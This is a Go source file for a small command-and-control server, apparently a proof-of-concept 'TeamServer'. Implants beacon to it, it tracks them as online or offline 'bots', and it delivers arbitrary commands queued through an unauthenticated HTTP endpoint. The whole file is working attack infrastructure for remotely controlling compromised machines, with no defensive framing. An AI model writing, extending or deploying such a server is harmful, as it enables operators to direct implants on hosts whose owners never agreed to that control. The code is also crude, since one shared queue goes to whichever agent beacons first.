package main

import (
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"sync"
	"time"
)

// Agent represents a connected implant
type Agent struct {
	ID        string    `json:"id"`
	IP        string    `json:"ip"`
	LastSeen  time.Time `json:"last_seen"`
	Status    string    `json:"status"` // "Online" or "Offline"
}

var (
	// command queue (global for this PoC)
	cmdQueue string
	mutex    sync.Mutex
	
	// Agent tracking
	agents = make(map[string]*Agent)
)

func main() {
	// Start HTTP Server
	http.HandleFunc("/api/beacon", beaconHandler)
	http.HandleFunc("/api/agents", agentsHandler) // For GUI to list bots
	http.HandleFunc("/api/queue", queueHandler)   // For GUI to send commands
	
	fmt.Println("[-] TeamServer listening on :8080")
	fmt.Println("[-] API Ready: /api/agents, /api/queue")
	if err := http.ListenAndServe(":8080", nil); err != nil {
		panic(err)
	}
}

func beaconHandler(w http.ResponseWriter, r *http.Request) {
	if r.Method != "POST" {
		http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
		return
	}

	mutex.Lock()
	defer mutex.Unlock()

	// 1. Register/Update Agent
	// Use IP as ID for simplicity
	agentID := r.RemoteAddr
	if _, exists := agents[agentID]; !exists {
		fmt.Printf("[+] New Agent Joined: %s\n", agentID)
	}
	
	agents[agentID] = &Agent{
		ID:       agentID,
		IP:       agentID,
		LastSeen: time.Now(),
		Status:   "Online",
	}

	// 2. Handle Command
	if cmdQueue != "" {
		fmt.Printf("[+] Sending command to %s: %s\n", agentID, cmdQueue)
		io.WriteString(w, cmdQueue)
		cmdQueue = "" // Clear queue
	} else {
		io.WriteString(w, "sleep")
	}
}

// GUI: Get list of agents
func agentsHandler(w http.ResponseWriter, r *http.Request) {
	mutex.Lock()
	defer mutex.Unlock()
	
	// Update status based on timeout
	var list []*Agent
	for _, a := range agents {
		if time.Since(a.LastSeen) > 10*time.Second {
			a.Status = "Offline"
		} else {
			a.Status = "Online"
		}
		list = append(list, a)
	}
	
	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(list)
}

// GUI: Send a command
func queueHandler(w http.ResponseWriter, r *http.Request) {
	if r.Method != "POST" {
		http.Error(w, "Only POST allowed", http.StatusMethodNotAllowed)
		return
	}
	
	body, _ := io.ReadAll(r.Body)
	cmd := string(body)
	
	mutex.Lock()
	cmdQueue = cmd
	mutex.Unlock()
	
	fmt.Printf("    [*] GUI Queued: %s\n", cmd)
	fmt.Fprintf(w, "Queued: %s", cmd)
}
